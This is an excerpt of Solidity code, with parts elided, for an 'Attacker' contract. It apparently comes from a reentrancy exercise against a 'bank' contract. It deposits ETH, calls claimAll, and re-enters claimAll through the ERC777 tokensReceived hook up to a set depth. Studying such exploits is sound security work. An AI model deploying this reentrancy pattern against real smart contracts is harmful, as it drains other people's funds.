...
contract Attacker is AccessControl, IERC777Recipient {
    ...
    */
    function attack(uint256 amt) payable public {
        ...
        // Start the attack by depositing ETH into the bank contract
        bank.deposit{value: amt}();

        // Trigger the reentrant call by claiming all tokens
        bank.claimAll();
    }
    ...
    */
    function tokensReceived(
        ...
        // Recursively call claimAll to exploit the vulnerability up to max_depth
        if (depth < max_depth) {
            depth++;
            emit Recurse(depth);
            bank.claimAll();
